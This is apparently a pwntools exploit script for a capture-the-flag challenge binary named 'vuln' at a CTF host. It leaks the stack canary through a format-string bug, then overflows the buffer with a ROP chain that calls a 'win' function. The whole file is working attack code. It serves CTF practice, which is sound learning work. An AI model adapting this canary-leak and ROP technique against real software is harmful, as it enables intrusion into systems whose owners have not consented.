#!/usr/bin/env python3
from pwn import *


context.binary = elf = ELF("./vuln", checksec=False)
context.arch = "amd64"

HOST = "chal.bearcatctf.io"
PORT = 28799


def start():
    if args.REMOTE:
        host = args.HOST or HOST
        port = int(args.PORT or PORT)
        return remote(host, port)
    return process(elf.path, stdin=PIPE, stdout=PIPE, stderr=PIPE)


def main():
    # io = start()
    io = remote(HOST, PORT)

    pop_rdi = 0x40132D
    pop_rsi = 0x40132F
    ret = 0x40132C
    win = elf.symbols["win"]

    # Leak stack canary via format string in printf(buf).
    io.recvuntil(b"But first what is your name pirate? ")
    io.send(b"%13$p\x00".ljust(10, b"A"))
    io.recvuntil(b"Hello ")
    canary = int(io.recvline().strip(), 16)
    log.success(f"canary = {canary:#x}")

    io.recvuntil(b"Where do you think the treasure is? ")

    payload = b"A" * 40
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(pop_rdi)
    payload += p64(6)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(ret)
    payload += p64(win)

    io.send(payload)
    print(io.recvall(timeout=2).decode(errors="ignore"))


if __name__ == "__main__":
    main()
